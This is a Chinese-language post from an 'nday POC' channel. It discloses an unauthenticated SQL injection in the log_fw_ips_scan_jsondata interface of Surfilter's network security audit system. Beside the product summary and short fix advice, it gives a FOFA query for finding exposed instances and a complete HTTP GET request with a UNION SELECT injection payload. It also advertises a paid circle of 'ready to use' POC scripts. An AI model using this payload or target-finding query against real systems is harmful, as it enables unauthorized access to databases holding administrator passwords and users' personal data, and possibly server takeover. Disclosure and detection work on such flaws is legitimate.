#  任子行网络安全审计系统 log_fw_ips_scan_jsondata SQL注入漏洞   
Superhero  nday POC   2024-12-02 02:13  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
任子行网络安全审计系统SURF-SA系列产品是任子行为各行业提供的自主可控信息化办公环境上网行为审计的安全服务。是一款功能强大、灵活配置的网络安全审计工具，适用于各种网络环境，为网络管理者提供了全面的审计、监控和管理功能，对网络协议交互、网页浏览、邮件收发、文件传输、IM信息等行为进行全面、实时审计。留存归档审计日志，并对审计结果进行统计和关联分析，帮助网络管理者及时洞察网络 异常及用户行为风险。  
  
  
**01******  
  
**漏洞概述**  
  
  
任子行网络安全审计系统 log_fw_ips_scan_jsondata 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
title="任子行网络安全审计系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJ8XibNyPomZWM6ZJ9f7icA62wic46iazcYSTpoYqchhPgIaxicSxiaKcpzWRbM1ww4g5eFnuuR82xE9AZg/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
GET /webui/?g=log_fw_ips_scan_jsondata&uname='+union+select+sqlite_version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+ HTTP/1.1
Host: 
Referer: https://
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJ8XibNyPomZWM6ZJ9f7icA624vvoPZVDd0YarhQA4Rqxzn67eQicmFhI5EhYqAicYHwMx0ibdp3icdL1icQ/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJ8XibNyPomZWM6ZJ9f7icA62lfibMSiaibkpsibygnicpicFhQpgUzU0aBkCLXA1ibSgDWvTwdVR5THKSv2aQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJ8XibNyPomZWM6ZJ9f7icA625rIoLzqlGTG4lVfMXpNL1m4zaWM5OvDkMx1lBp2CGFMnY0RRB0FKmg/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJ8XibNyPomZWM6ZJ9f7icA62J7lkgTMyDV9VPxicxAyiblkI4fRxFKRgSicMxFcsl4Zm7o9LicukPwx1uQ/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
